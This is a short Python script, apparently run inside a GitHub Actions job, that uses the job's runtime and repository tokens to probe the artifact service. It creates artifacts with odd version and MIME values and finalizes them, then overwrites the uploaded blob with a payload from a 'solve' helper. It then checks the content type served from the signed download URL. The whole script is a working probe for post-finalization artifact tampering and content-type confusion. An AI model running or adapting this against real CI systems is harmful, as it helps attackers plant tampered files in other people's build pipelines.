import os, uuid, urllib.request, urllib.error, urllib.parse
import solve

run_id, job_id = solve.backend_ids(os.environ['ACTIONS_RUNTIME_TOKEN'])
common = {'workflow_run_backend_id':run_id,'workflow_job_run_backend_id':job_id}
repo=os.environ['GITHUB_REPOSITORY']
secret=os.environ['GITHUB_TOKEN']
candidates=[
 ('v0_omitted',0,None),
 ('v1_omitted',1,None),
 ('v2_omitted',2,None),
 ('v3_omitted',3,None),
 ('vneg1_omitted',-1,None),
 ('v9_json',9,'application/json'),
 ('v2147483647_json',2147483647,'application/json'),
]
class Stop(urllib.request.HTTPRedirectHandler):
 def redirect_request(self,*args): return None
opener=urllib.request.build_opener(Stop)
for label,version,mime in candidates:
 name='probe-'+uuid.uuid4().hex[:10]+('.zip' if version<7 else '.json')
 try:
  request={**common,'name':name,'version':version}
  if mime is not None: request['mime_type']=mime
  created=solve.twirp('CreateArtifact',request)
 except urllib.error.HTTPError as error:
  print(label,'create_http',error.code,flush=True); continue
 except Exception as error:
  print(label,'create_error',type(error).__name__,str(error)[:80],flush=True); continue
 try:
  url=created['signed_upload_url']
  solve.put_blob(url,b'{}')
  final=solve.finalize_artifact(common,name,b'{}')
  artifact_id=str(final['artifact_id'])
  body=solve.payload(repo,artifact_id)
  solve.put_blob(url,body)
  api='https://api.github.com/repos/'+repo+'/actions/artifacts/'+artifact_id+'/zip'
  req=urllib.request.Request(api,headers={'Authorization':'Bearer '+secret})
  try: response=opener.open(req,timeout=15)
  except urllib.error.HTTPError as error: response=error
  location=response.headers.get('Location','')
  query=urllib.parse.parse_qs(urllib.parse.urlsplit(location).query)
  rsct=query.get('rsct',[''])[0]
  with urllib.request.urlopen(urllib.request.Request(location,method='HEAD'),timeout=15) as blob_response:
   actual_content_type=blob_response.headers.get('Content-Type')
  print(label,'artifact_id',artifact_id,'rsct',repr(rsct),'actual_ct',repr(actual_content_type),'sha256',__import__('hashlib').sha256(body).hexdigest(),flush=True)
 except Exception as error:
  print(label,'after_create_error',type(error).__name__,str(error)[:80],flush=True)
